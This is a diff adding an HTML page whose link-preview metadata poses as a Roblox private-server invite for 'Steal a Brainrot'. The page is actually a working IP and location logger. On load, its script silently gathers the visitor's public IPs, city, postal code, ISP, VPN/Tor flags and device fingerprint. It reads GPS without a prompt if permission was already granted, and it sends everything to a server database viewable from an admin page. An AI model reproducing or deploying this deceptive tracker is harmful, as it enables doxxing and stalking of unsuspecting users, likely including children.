@@ -1,0 +1,578 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+
+  <title>Roblox</title>
+
+  <meta property="og:site_name" content="Roblox" />
+  <meta property="og:title" content="Join Private Server" />
+  <meta name="twitter:title" content="Join Private Server" />
+
+  <meta
+	property="og:description"
+	content="🗣️ Welcome to Steal a Brainrot!
+
+👍 Like the game and join the group
+
+How to Play:
+👽 Buy a Brainrot
+🥷 Steal Brainrots from other players
+💸 Generate money
+🐦‍🔥 Rebirth
+✋ Buy slaps and troll gear to troll other players!
+
+💻 Supports Desktop, Mobile and Tablet players
+
+🙏 Credit to Chris for letting us use the Nyan Cat!
+🙏 Credit to WinnersTakesAll for the backpack system!"
+  />
+  <meta
+	name="twitter:description"
+	content="🗣️ Welcome to Steal a Brainrot!
+
+👍 Like the game and join the group
+
+How to Play:
+👽 Buy a Brainrot
+🥷 Steal Brainrots from other players
+💸 Generate money
+🐦‍🔥 Rebirth
+✋ Buy slaps and troll gear to troll other players!
+
+💻 Supports Desktop, Mobile and Tablet players
+
+🙏 Credit to Chris for letting us use the Nyan Cat!
+🙏 Credit to WinnersTakesAll for the backpack system!"
+  />
+
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="theme-color" content="#121212" />
+
+  <style>
+	:root { color-scheme: dark; }
+	* { box-sizing:border-box; }
+	body{
+	  margin:0;
+	  font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+	  color:#eaeaea;
+	  background:
+		radial-gradient(1200px 700px at 20% 0%, rgba(59,130,246,.18), transparent 64%),
+		radial-gradient(900px 520px at 95% 15%, rgba(168,85,247,.14), transparent 60%),
+		radial-gradient(900px 520px at 50% 110%, rgba(34,197,94,.11), transparent 55%),
+		#0b0b0b;
+	  min-height:100vh;
+	  padding:18px;
+	  display:grid; place-items:center;
+	  overflow-x:hidden;
+	}
+	.shell{ width:min(1100px, 94vw); }
+
+	.topbar{
+	  display:flex; align-items:center; justify-content:space-between;
+	  gap:12px; flex-wrap:wrap; margin-bottom:14px;
+	}
+	.brand{ display:flex; align-items:center; gap:12px; }
+	.logo{
+	  width:42px; height:42px; border-radius:14px;
+	  background: linear-gradient(135deg, rgba(59,130,246,.95), rgba(168,85,247,.85));
+	  border:1px solid rgba(255,255,255,.09);
+	  box-shadow: 0 18px 60px rgba(0,0,0,.55);
+	  display:grid; place-items:center;
+	  font-weight:1000;
+	  letter-spacing:-.5px;
+	}
+	.titlewrap p{ margin:0; color:#a9a9a9; font-weight:800; font-size:13px; }
+	.titlewrap h1{ margin:2px 0 0; font-size:22px; letter-spacing:-.2px; }
+
+	.btn{
+	  padding:10px 12px;
+	  border-radius:14px;
+	  border:1px solid #2a2a2a;
+	  background:#111;
+	  color:#fff;
+	  cursor:pointer;
+	  font-weight:950;
+	  text-decoration:none;
+	  display:inline-flex;
+	  align-items:center;
+	  gap:8px;
+	  transition: transform .12s ease, border-color .12s ease, background .12s ease;
+	  user-select:none;
+	}
+	.btn:hover{ transform: translateY(-1px); border-color:#3b82f6; }
+	.btn.primary{ background:#3b82f6; border:0; box-shadow: 0 14px 30px rgba(59,130,246,.20); }
+	.btn.primary:hover{ background:#2f76f2; border-color:transparent; }
+	.btn:disabled{ opacity:.6; cursor:not-allowed; transform:none; }
+
+	.card{
+	  background: rgba(17,17,17,.92);
+	  border:1px solid #2a2a2a;
+	  border-radius:22px;
+	  overflow:hidden;
+	  box-shadow: 0 22px 80px rgba(0,0,0,.60);
+	}
+
+	.hero{
+	  padding:18px;
+	  display:grid;
+	  grid-template-columns: 1.15fr .85fr;
+	  gap:16px;
+	  align-items:stretch;
+	}
+	@media (max-width: 920px){ .hero{ grid-template-columns:1fr; } }
+
+	.pill{
+	  display:inline-flex; align-items:center; gap:8px;
+	  padding:7px 10px; border-radius:999px;
+	  border:1px solid #2a2a2a; background:#0e0e0e;
+	  font-size:12px; color:#d7d7d7; font-weight:900;
+	}
+	.pill.good{ border-color: rgba(34,197,94,.35); }
+	.pill.warn{ border-color: rgba(245,158,11,.45); }
+	.pill.bad { border-color: rgba(239,68,68,.45); }
+
+	h2{ margin:0; font-size:34px; letter-spacing:-.6px; line-height:1.05; }
+	.sub{ margin:0; color:#cfcfcf; line-height:1.45; font-size:14.5px; }
+
+	.fgrid{
+	  margin-top:12px;
+	  display:grid;
+	  grid-template-columns: 1fr 1fr;
+	  gap:10px;
+	}
+	@media (max-width: 520px){ .fgrid{ grid-template-columns:1fr; } }
+	.fcard{
+	  border:1px solid #2a2a2a; background:#0e0e0e;
+	  border-radius:16px; padding:12px;
+	}
+	.fcard .t{ font-weight:1000; margin:0 0 4px; }
+	.fcard .d{ margin:0; color:#a9a9a9; font-size:13px; line-height:1.35; }
+
+	.panel{
+	  border:1px solid #2a2a2a; background:#0e0e0e;
+	  border-radius:18px; padding:12px;
+	  display:flex; flex-direction:column; gap:10px;
+	}
+	.kv{ display:grid; grid-template-columns:120px 1fr; gap:6px 10px; align-items:start; }
+	.k{ color:#a9a9a9; font-size:12px; }
+	.v{ color:#eaeaea; font-size:13px; word-break:break-word; }
+	.mono{ font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas,"Liberation Mono","Courier New", monospace; }
+
+	.iconbtn{
+	  display:inline-flex; align-items:center; justify-content:center;
+	  width:30px; height:30px; border-radius:10px;
+	  border:1px solid #2a2a2a; background:#0b0b0b;
+	  cursor:pointer;
+	}
+	.iconbtn:hover{ border-color:#3b82f6; }
+
+	.section{
+	  padding:16px 18px;
+	  border-top:1px solid #222;
+	  background: linear-gradient(180deg, rgba(14,14,14,.80), rgba(14,14,14,.58));
+	}
+	pre{
+	  margin:0;
+	  white-space:pre-wrap;
+	  word-break:break-word;
+	  background:#0b0b0b;
+	  border:1px solid #2a2a2a;
+	  padding:12px;
+	  border-radius:16px;
+	  color:#d7d7d7;
+	  min-height: 92px;
+	  font-size:12.5px;
+	  line-height:1.35;
+	}
+	.hint{
+	  color:#9a9a9a;
+	  font-size:12.5px;
+	  line-height:1.35;
+	}
+
+	.toast{
+	  position:fixed; left:50%; bottom:18px; transform:translateX(-50%);
+	  background:#101010; border:1px solid #2a2a2a; color:#eaeaea;
+	  padding:10px 12px; border-radius:999px; font-size:13px;
+	  opacity:0; pointer-events:none; transition:opacity .18s ease;
+	  box-shadow: 0 16px 40px rgba(0,0,0,.45);
+	}
+	.toast.show{ opacity:1; }
+  </style>
+</head>
+
+<body>
+  <div class="shell">
+	<div class="topbar">
+	  <div class="brand">
+		<div class="logo">D</div>
+		<div class="titlewrap">
+		  <p>Diagnostics</p>
+		  <h1>Connection & Device Snapshot</h1>
+		</div>
+	  </div>
+
+	  <div style="display:flex; gap:10px; flex-wrap:wrap;">
+		<a class="btn" href="/admin">🛠️ Admin</a>
+		<button class="btn" id="retryBtn" type="button">↻ Retry</button>
+	  </div>
+	</div>
+
+	<div class="card">
+	  <div class="hero">
+		<div>
+		  <div style="display:flex; gap:10px; align-items:center; flex-wrap:wrap; margin-bottom:10px;">
+			<span class="pill" id="statePill">⏳ Starting…</span>
+			<span class="pill" id="vpnPill">🛡️ Flags: —</span>
+			<span class="pill" id="savePill">📝 Not saved</span>
+		  </div>
+
+		  <h2>Clean, fast, automatic.</h2>
+		  <p class="sub">
+			This page automatically captures a device/network snapshot and saves it to the database.
+			GPS is <b>not required</b> — used only if permission was already granted, or if you press “Improve accuracy”.
+		  </p>
+
+		  <div class="fgrid">
+			<div class="fcard"><p class="t">⚡ Auto capture</p><p class="d">No submit button. Saves on load.</p></div>
+			<div class="fcard"><p class="t">📋 Copy IPs</p><p class="d">One-click copy for IPv4 / IPv6.</p></div>
+			<div class="fcard"><p class="t">🧭 Optional GPS</p><p class="d">Won’t block saving if disabled.</p></div>
+			<div class="fcard"><p class="t">🗂️ Admin tools</p><p class="d">Search, export, clear database.</p></div>
+		  </div>
+
+		  <div style="display:flex; gap:10px; flex-wrap:wrap; margin-top:12px;">
+			<button class="btn primary" id="accuracyBtn" type="button">🧭 Improve accuracy</button>
+		  </div>
+
+		  <p class="hint" style="margin-top:10px;">
+			Note: VPN/proxy flags are best-effort; you cannot reliably “bypass” VPNs.
+		  </p>
+		</div>
+
+		<div class="panel">
+		  <div style="font-weight:1000;">Snapshot Preview</div>
+		  <div class="kv">
+			<div class="k">IPv4</div>
+			<div class="v">
+			  <span class="mono" id="ipv4Txt">—</span>
+			  <button class="iconbtn" id="copyV4" title="Copy IPv4" aria-label="Copy IPv4">📋</button>
+			</div>
+
+			<div class="k">IPv6</div>
+			<div class="v">
+			  <span class="mono" id="ipv6Txt">—</span>
+			  <button class="iconbtn" id="copyV6" title="Copy IPv6" aria-label="Copy IPv6">📋</button>
+			</div>
+
+			<div class="k">Location</div>
+			<div class="v" id="locTxt">—</div>
+
+			<div class="k">Coords</div>
+			<div class="v mono" id="coordTxt">—</div>
+
+			<div class="k">Network</div>
+			<div class="v" id="netTxt">—</div>
+		  </div>
+
+		  <div class="hint" id="gpsLine">GPS: not used</div>
+		</div>
+	  </div>
+
+	  <div class="section">
+		<div class="row">
+		  <div style="font-weight:1000;">Status</div>
+		  <div class="muted" id="netHint">—</div>
+		</div>
+		<div style="margin-top:10px;">
+		  <pre id="statusOut">Loading…</pre>
+		</div>
+	  </div>
+	</div>
+  </div>
+
+  <div class="toast" id="toast">Saved</div>
+
+  <script>
+	const statePill = document.getElementById("statePill");
+	const vpnPill = document.getElementById("vpnPill");
+	const savePill = document.getElementById("savePill");
+	const statusOut = document.getElementById("statusOut");
+	const netHint = document.getElementById("netHint");
+
+	const ipv4Txt = document.getElementById("ipv4Txt");
+	const ipv6Txt = document.getElementById("ipv6Txt");
+	const locTxt = document.getElementById("locTxt");
+	const coordTxt = document.getElementById("coordTxt");
+	const netTxt = document.getElementById("netTxt");
+	const gpsLine = document.getElementById("gpsLine");
+
+	const copyV4 = document.getElementById("copyV4");
+	const copyV6 = document.getElementById("copyV6");
+	const retryBtn = document.getElementById("retryBtn");
+	const accuracyBtn = document.getElementById("accuracyBtn");
+
+	const toast = document.getElementById("toast");
+
+	function setPill(el, text, cls){
+	  el.classList.remove("good","warn","bad");
+	  if (cls) el.classList.add(cls);
+	  el.textContent = text;
+	}
+	function showToast(msg){
+	  toast.textContent = msg;
+	  toast.classList.add("show");
+	  clearTimeout(showToast._t);
+	  showToast._t = setTimeout(()=>toast.classList.remove("show"), 1100);
+	}
+	async function copyText(text){
+	  if (!text || text === "—") return showToast("Nothing to copy");
+	  try{ await navigator.clipboard.writeText(text); showToast("✅ Copied"); }
+	  catch{ showToast("❌ Copy failed"); }
+	}
+
+	function safe(v){ return (v === null || v === undefined || v === "") ? "" : String(v); }
+	function num(v){ const x = Number(v); return Number.isFinite(x) ? x : null; }
+
+	const deviceInfo = {
+	  userAgent: navigator.userAgent,
+	  platform: navigator.platform,
+	  language: navigator.language,
+	  timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+	  screen: `${screen.width}x${screen.height}`,
+	  viewport: `${innerWidth}x${innerHeight}`,
+	  devicePixelRatio: window.devicePixelRatio,
+	  touchPoints: navigator.maxTouchPoints,
+	  deviceName: (navigator.userAgentData?.platform) || navigator.platform || "Unknown",
+	};
+
+	let publicIP = null;
+	let publicIPv4 = null;
+	let publicIPv6 = null;
+
+	let geo = {
+	  country: "", region: "", city: "", postal: "",
+	  isp: "", org: "", asn: "",
+	  lat: null, lon: null,
+	  is_vpn: 0, is_proxy: 0, is_tor: 0
+	};
+
+	let gps = { lat: null, lon: null, accuracy_m: null };
+
+	function bestCoords(){
+	  if (gps.lat != null && gps.lon != null) return { lat:gps.lat, lon:gps.lon, kind:"GPS" };
+	  if (geo.lat != null && geo.lon != null) return { lat:geo.lat, lon:geo.lon, kind:"IP" };
+	  return null;
+	}
+
+	function render(){
+	  ipv4Txt.textContent = publicIPv4 || "—";
+	  ipv6Txt.textContent = publicIPv6 || "—";
+	  locTxt.textContent = [geo.city, geo.region, geo.country].filter(Boolean).join(", ") || "—";
+
+	  const coords = bestCoords();
+	  coordTxt.textContent = coords ? `${coords.kind}: ${coords.lat.toFixed(6)}, ${coords.lon.toFixed(6)}` : "—";
+	  netTxt.textContent = [geo.isp || geo.org, geo.asn].filter(Boolean).join(" • ") || "—";
+	  gpsLine.textContent = (gps.lat != null) ? `GPS: used (~${Math.round(gps.accuracy_m || 0)}m)` : "GPS: not used";
+
+	  const flags = [];
+	  if (geo.is_vpn) flags.push("VPN");
+	  if (geo.is_proxy) flags.push("Proxy");
+	  if (geo.is_tor) flags.push("Tor");
+	  setPill(vpnPill, `🛡️ Flags: ${flags.length ? flags.join(" / ") : "—"}`, flags.length ? "warn" : "good");
+	  netHint.textContent = navigator.onLine ? "Online" : "Offline";
+	}
+
+	async function fetchJson(url, timeoutMs=9000){
+	  const ctrl = new AbortController();
+	  const t = setTimeout(()=>ctrl.abort(), timeoutMs);
+	  try{
+		const res = await fetch(url, { signal: ctrl.signal });
+		const txt = await res.text();
+		if (!res.ok) throw new Error(`HTTP ${res.status}: ${txt.slice(0,160)}`);
+		try{ return JSON.parse(txt); }
+		catch{ throw new Error(`Non-JSON from ${url}: ${txt.slice(0,120)}`); }
+	  } finally {
+		clearTimeout(t);
+	  }
+	}
+
+	async function loadIPsAndIntel(){
+	  setPill(statePill, "⏳ Collecting…", "warn");
+	  statusOut.textContent = "Collecting IPv4/IPv6 + IP intelligence…";
+
+	  const [v4, v6] = await Promise.allSettled([
+		fetchJson("https://api.ipify.org?format=json"),
+		fetchJson("https://api64.ipify.org?format=json"),
+	  ]);
+	  publicIPv4 = (v4.status === "fulfilled" && v4.value?.ip) ? v4.value.ip : null;
+	  publicIPv6 = (v6.status === "fulfilled" && v6.value?.ip) ? v6.value.ip : null;
+
+	  const [who, ipapi] = await Promise.allSettled([
+		fetchJson("https://ipwho.is/"),
+		fetchJson("https://ipapi.co/json/"),
+	  ]);
+
+	  const whoD = (who.status === "fulfilled" && who.value && who.value.success !== false) ? who.value : null;
+	  const ipapiD = (ipapi.status === "fulfilled") ? ipapi.value : null;
+
+	  publicIP = (whoD && whoD.ip) || (ipapiD && ipapiD.ip) || publicIPv6 || publicIPv4 || null;
+
+	  if (whoD){
+		geo.country = safe(whoD.country);
+		geo.region = safe(whoD.region);
+		geo.city = safe(whoD.city);
+		geo.postal = safe(whoD.postal);
+
+		geo.lat = num(whoD.latitude);
+		geo.lon = num(whoD.longitude);
+
+		geo.isp = safe(whoD.connection?.isp);
+		geo.org = safe(whoD.connection?.org);
+		geo.asn = safe(whoD.connection?.asn ? `AS${whoD.connection.asn}` : "");
+
+		geo.is_proxy = whoD.proxy ? 1 : 0;
+		const type = safe(whoD.type).toLowerCase();
+		geo.is_vpn = type.includes("vpn") ? 1 : 0;
+		geo.is_tor = type.includes("tor") ? 1 : 0;
+	  }
+
+	  if (ipapiD){
+		geo.country = geo.country || safe(ipapiD.country_name || ipapiD.country);
+		geo.region  = geo.region  || safe(ipapiD.region || ipapiD.region_code);
+		geo.city    = geo.city    || safe(ipapiD.city);
+		geo.postal  = geo.postal  || safe(ipapiD.postal);
+
+		geo.org = geo.org || safe(ipapiD.org);
+		geo.isp = geo.isp || safe(ipapiD.org || ipapiD.isp);
+		geo.asn = geo.asn || safe(ipapiD.asn || ipapiD.asn_org);
+
+		const lat = num(ipapiD.latitude) ?? num(ipapiD.lat);
+		const lon = num(ipapiD.longitude) ?? num(ipapiD.lon);
+		if (geo.lat == null && lat != null) geo.lat = lat;
+		if (geo.lon == null && lon != null) geo.lon = lon;
+	  }
+
+	  render();
+	  setPill(statePill, "✅ Ready", "good");
+	  statusOut.textContent = "Captured snapshot. Saving…";
+	}
+
+	async function tryGPSsilently(){
+	  // Use GPS only if already granted (no prompt). Never blocks saving.
+	  if (!navigator.permissions || !navigator.geolocation) return;
+	  try{
+		const p = await navigator.permissions.query({ name: "geolocation" });
+		if (p.state !== "granted") return;
+	  } catch { return; }
+
+	  await new Promise((resolve)=>{
+		navigator.geolocation.getCurrentPosition(
+		  (pos)=>{
+			gps.lat = pos.coords.latitude;
+			gps.lon = pos.coords.longitude;
+			gps.accuracy_m = pos.coords.accuracy;
+			resolve();
+		  },
+		  ()=>resolve(),
+		  { enableHighAccuracy:true, timeout:7000, maximumAge:0 }
+		);
+	  });
+
+	  render();
+	}
+
+	async function requestGPSwithGesture(){
+	  if (!navigator.geolocation){
+		statusOut.textContent = "GPS not supported in this browser.";
+		return;
+	  }
+	  setPill(statePill, "🧭 GPS…", "warn");
+	  statusOut.textContent = "Requesting GPS permission…";
+
+	  await new Promise((resolve)=>{
+		navigator.geolocation.getCurrentPosition(
+		  (pos)=>{
+			gps.lat = pos.coords.latitude;
+			gps.lon = pos.coords.longitude;
+			gps.accuracy_m = pos.coords.accuracy;
+			resolve();
+		  },
+		  (err)=>{
+			statusOut.textContent = "GPS not used: " + (err?.message || "permission denied");
+			resolve();
+		  },
+		  { enableHighAccuracy:true, timeout:10000, maximumAge:0 }
+		);
+	  });
+
+	  render();
+	  setPill(statePill, "✅ Ready", "good");
+	  // Save again (new row with GPS included)
+	  await saveToDb("gps_update");
+	}
+
+	async function saveToDb(reason="auto"){
+	  if (saveToDb._saving) return;
+	  saveToDb._saving = true;
+
+	  setPill(statePill, "🛰️ Saving…", "warn");
+	  setPill(savePill, "📝 Saving…", "warn");
+	  statusOut.textContent = `Saving to database… (${reason})`;
+
+	  try{
+		const res = await fetch("/api/submit", {
+		  method:"POST",
+		  headers:{ "Content-Type":"application/json" },
+		  body: JSON.stringify({
+			publicIP,
+			publicIPv4,
+			publicIPv6,
+			deviceInfo,
+			geo,
+			gps,
+			page: { referrer: document.referrer || "", url: location.href }
+		  })
+		});
+
+		const txt = await res.text();
+		let json;
+		try{ json = JSON.parse(txt); }
+		catch{ throw new Error(`Server returned non-JSON (HTTP ${res.status}). First 200 chars:\n` + txt.slice(0,200)); }
+
+		if (!res.ok || !json.ok) throw new Error(json.error || `HTTP ${res.status}`);
+
+		setPill(statePill, "✅ Saved", "good");
+		setPill(savePill, "✅ Saved", "good");
+		statusOut.textContent = "✅ Saved. Open Admin to view stored records.";
+		showToast("✅ Saved");
+	  } catch(e){
+		setPill(statePill, "⚠️ Not saved", "bad");
+		setPill(savePill, "⚠️ Not saved", "bad");
+		statusOut.textContent = "❌ Save failed: " + (e?.message || String(e));
+		showToast("❌ Save failed");
+	  } finally {
+		saveToDb._saving = false;
+	  }
+	}
+
+	async function boot(){
+	  setPill(statePill, "⏳ Starting…", "warn");
+	  setPill(savePill, "📝 Not saved", "");
+	  statusOut.textContent = "Starting…";
+
+	  await loadIPsAndIntel();
+	  await tryGPSsilently(); // no prompt, never blocks
+	  await saveToDb("auto");
+	}
+
+	retryBtn.onclick = boot;
+	accuracyBtn.onclick = requestGPSwithGesture;
+	copyV4.onclick = ()=>copyText(publicIPv4 || "—");
+	copyV6.onclick = ()=>copyText(publicIPv6 || "—");
+
+	window.addEventListener("DOMContentLoaded", boot);
+  </script>
+</body>
+</html>
